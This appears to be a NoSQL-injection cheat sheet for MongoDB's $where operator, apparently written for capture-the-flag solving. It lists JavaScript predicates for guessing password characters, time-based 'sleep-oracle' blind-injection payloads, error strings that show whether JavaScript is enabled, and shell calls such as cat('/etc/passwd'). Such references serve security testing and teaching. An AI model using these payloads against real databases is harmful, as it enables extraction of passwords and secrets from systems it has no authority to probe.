# `$where` deep — the JS-predicate's full grammar

## The `$where` — the JS-filter

```javascript
db.users.find({$where: "this.pass[0] == 'f'"})
db.users.find({$where: "function() { return this.pass[0] == 'f'; }"})
db.users.find({$where: "function() { return this.pass === 'x'; }"})
db.users.find({$where: "this.pass == 'x'"})
db.users.find({$where: "this.user == 'admin' && this.pass == 'x'"})
db.users.find({user: "admin", $where: "this.pass == 'x'"})
db.users.find({$where: /this.pass/})
db.users.find({$where: "return this.pass == 'x';"})
db.users.find({$where: "return this.pass !== undefined;"})
db.users.find({$where: "return !!this.pass;"})
db.users.find({$where: "return Boolean(this.pass);"})
db.users.find({$where: "return !!this.flag;"})
db.users.find({$where: "return this.flag !== undefined;"})
db.users.find({$where: "return typeof this.pass == 'string';"})
db.users.find({$where: "return typeof this.pass !== 'undefined';"})
db.users.find({$where: "return this.pass != null;"})
db.users.find({$where: "return this.pass != '';"})
db.users.find({$where: "return this.pass.length > 0;"})
db.users.find({$where: "return this.pass.length > 0;"})
db.users.find({$where: "return this.pass.length == 32;"})
db.users.find({$where: "return this.pass.length === 32;"})
db.users.find({$where: "return this.pass.length >= 20;"})
db.users.find({$where: "return this.pass.length <= 64;"})
```

`$where` — `operators-js.md` — `enableJs` required.

## The `this` — the doc-context

```javascript
$this.pass                    — the doc's field
this.pass                     — same
this["pass"]                  — bracket-access
this['pass']                  — quote-variant
this.pass[0]                  — char-at
this.pass[0] == 'f'           — char-compare
this.pass[0] === 'f'          — strict
this.pass.length              — length
this.pass.length == 32        — length-check
this.pass.substr(0, 4)        — substr
this.pass.substring(0, 4)     — substring
this.pass.slice(0, 4)         — slice
this.pass.at(0)               — at()
this.pass.charAt(0)           — charAt
this.pass.charCodeAt(0)       — charCodeAt
this.pass.codePointAt(0)      — codePointAt
this.pass.indexOf('{')        — indexOf
this.pass.lastIndexOf('}')    — lastIndexOf
this.pass.startsWith('f')     — startsWith
this.pass.endsWith('}')       — endsWith
this.pass.includes('{')       — includes
this.pass.match(/^a/)         — match
this.pass.match(/^a/g)        — match-global
this.pass.search('^a')        — search
this.pass.replace(/^a/, '')   — replace
this.pass.split('{')          — split
this.pass.split('{')[1]       — split-index
this.pass.split('{')[1][0]    — split-index-char
this.pass.toUpperCase()       — toUpperCase
this.pass.toLowerCase()       — toLowerCase
this.pass.toString()          — toString
this.pass.toLowerCase().startsWith('flag')  — chained
```

The `this.` — the doc's full JS-object — `operators-js.md`.

## The `this` — the nested-path

```javascript
this.profile.role             — nested
this.profile.role == 'admin'  — nested-compare
this.items[0].price           — array-index
this.items[0]                 — array-elem
this.flags[0]                 — array-elem
this.tokens.length            — array-length
this.tokens[0].value          — array-subdoc
this.tokens[0].value == 'x'   — subdoc-compare
this.flags.map(f => f)        — array-map
this.flags.filter(f => f)     — array-filter
this.flags.some(f => f == 'x') — array-some
this.flags.every(f => f == 'x') — array-every
this.flags.find(f => f == 'x') — array-find
this.flags.findIndex(f => f == 'x') — array-findIndex
this.flags.includes('x')      — array-includes
this.flags.indexOf('x')       — array-indexOf
this.flags.join(',')          — array-join
this.flags.flat()             — array-flat
this.flags.flatMap(f => f)    — array-flatMap
this.flags.reduce((a, b) => a + b, 0) — array-reduce
this.flags.sort()             — array-sort
this.flags.reverse()          — array-reverse
this.flags.slice(0, 1)        — array-slice
this.flags.concat(['x'])      — array-concat
this.flags.push('x')          — array-push — MUTATES — write-side
this.flags.pop()              — array-pop — MUTATES
this.flags.shift()            — array-shift — MUTATES
this.flags.unshift('x')       — array-unshift — MUTATES
this.flags.splice(0, 1)       — array-splice — MUTATES
this.flags.fill('x')          — array-fill — MUTATES
```

The `push`/`pop`/`splice`/`fill`/`shift`/`unshift` — the array-mutators —
write-side, only on solver-created objects — `update-injection.md`.

## The `Object.*` — the object-methods

```javascript
Object.keys(this)             — the keys
Object.keys(this).length      — the count
Object.keys(this).includes('flag')  — the key-check
Object.values(this)           — the values
Object.values(this).includes('x')   — the value-check
Object.entries(this)          — the entries
Object.entries(this).find(([k, v]) => k == 'flag')  — the entry-find
Object.entries(this).some(([k, v]) => v == 'x')     — the entry-some
Object.entries(this).every(([k, v]) => v != null)   — the entry-every
Object.hasOwn(this, 'flag')   — the own-property
Object.getOwnPropertyNames(this)      — the names
Object.getOwnPropertyNames(this).includes('flag')   — the name-check
Object.getOwnPropertyDescriptors(this)              — the descriptors
Object.getPrototypeOf(this)                         — the proto
Object.isFrozen(this)                              — the freeze-check
Object.isSealed(this)                              — the seal-check
Object.isExtensible(this)                          — the ext-check
Object.is(this.pass, 'x')                          — the is-check
Object.assign({}, this)                            — the assign
Object.create(this)                                — the create
Object.freeze(this)                                — the freeze — MUTATES
Object.seal(this)                                  — the seal — MUTATES
Object.preventExtensions(this)                     — the prevent — MUTATES
Object.defineProperty(this, 'x', {value: 1})       — the define — MUTATES
Object.defineProperties(this, {x: {value: 1}})     — the defines — MUTATES
Object.setPrototypeOf(this, {})                    — the set-proto — MUTATES
```

`Object.*` — `operators-js.md`.

## The `JSON.*` — the serialization

```javascript
JSON.stringify(this)          — the doc's JSON
JSON.stringify(this.pass)     — the field's JSON
JSON.stringify(this).length   — the JSON-length
JSON.stringify(this).includes('flag')  — the JSON-check
JSON.parse(JSON.stringify(this))       — the deep-copy
JSON.parse('{}')              — the parse
JSON.parse('{"a":1}')         — the literal-parse
JSON.parse(this.q)            — the q-field-parse
```

`JSON.*` — `operators-js.md`.

## The `Date`/`Math`/`String`/`Number` — the builtins

```javascript
Date.now()                    — the timestamp
new Date()                    — the date
new Date().getTime()          — the time
new Date().getFullYear()      — the year
Math.floor(1.5)               — the floor
Math.random()                 — the random
String(this.pass)             — the toString
String(this.pass).length      — the toString-length
Number(this.pass)             — the toNumber
parseInt(this.pass)           — the parseInt
parseFloat(this.pass)         — the parseFloat
Boolean(this.pass)            — the toBool
!!this.pass                   — the double-bang
Array.isArray(this.pass)      — the isArray
isNaN(this.pass)              — the isNaN
isFinite(this.pass)           — the isFinite
decodeURIComponent(this.pass) — the decodeURIComponent
encodeURIComponent(this.pass) — the encodeURIComponent
atob(this.pass)               — the atob — base64-decode
btoa(this.pass)               — the btoa — base64-encode
```

`operators-js.md`.

## The `sleep`/`load`/`print` — the mongo-shell builtins

```javascript
sleep(3000)                   — the ms-sleep
load('file.js')               — the file-load — mongo-shell
print(this.pass)              — the print — mongo-shell
printjson(this)               — the print-json
printjsononeline(this)        — the print-one-line
db.users.find()               — the db-access — mongo-shell
db.runCommand({})             — the command — mongo-shell
tojson(this)                  — the to-json
tojsononeline(this)           — the to-json-one
version()                     — the version
hostname()                    — the host
cat('/etc/passwd')            — the file-read — mongo-shell
ls('/tmp')                    — the dir-list — mongo-shell
pwd()                         — the pwd — mongo-shell
quit()                        — the quit — mongo-shell
```

`sleep`/`load`/`print`/`cat`/`ls`/`pwd` — the mongo-shell builtins —
`enableJs` required — `operators-js.md` — `cat`/`ls`/`pwd`/`quit` are
shell-ONLY, not in the server-side `$where` (the server's JS-engine is
restricted) — but `sleep` may exist in some configs.

## The `$where` timing — the sleep-oracle

```javascript
this.pass[0] == 'f' ? sleep(3000) : true
this.pass[0] == 'f' && sleep(3000)
this.pass[0] == 'f' ? (sleep(3000), true) : true
this.pass[0] == 'f' ? sleep(3000) : sleep(0)
this.pass[0] != 'f' || sleep(3000)
this.pass[0] == 'f' ? sleep(3000) : null
this.pass[0] == 'f' ? sleep(3000) : undefined
this.pass[0] == 'f' ? sleep(3000) : 0
this.pass[0] == 'f' ? sleep(3000) : ''
this.pass[0] == 'f' ? sleep(3000) : []
this.pass[0] == 'f' ? sleep(3000) : {}
this.pass[0] == 'f' ? sleep(3000) : /x/
this.pass[0] == 'f' ? sleep(3000) : () => {}
this.pass[0] == 'f' ? (function() { sleep(3000); return true; })() : true
this.pass[0] == 'f' ? (function() { sleep(3000); })() : true
this.pass[0] == 'f' && (function() { sleep(3000); return true; })()
this.pass[0] == 'f' || (function() { sleep(3000); })()
this.pass[0] != 'f' || (function() { sleep(3000); })()
if (this.pass[0] == 'f') sleep(3000); true
if (this.pass[0] == 'f') { sleep(3000); } true
if (this.pass[0] == 'f') { sleep(3000); return true; } true
if (this.pass[0] == 'f') { sleep(3000); } else { } true
if (this.pass[0] == 'f') sleep(3000) else true
```

The sleep-oracle — `extraction.md` — 3× jitter baseline, 2+ repeaters.

## The `$where` falsifiers — `enableJs`

```text
MongoServerError: $where is not allowed          — enableJs off
MongoServerError: $where is not enabled          — same
MongoServerError: JavaScript execution is disabled
ReferenceError: sleep is not defined             — sleep blocked
ReferenceError: this is not defined              — this-scope broken
TypeError: Cannot read property 'pass' of undefined  — this.pass missing
TypeError: Cannot read properties of undefined (reading 'pass')
```

The error-falsifiers — `error-analysis.md`.
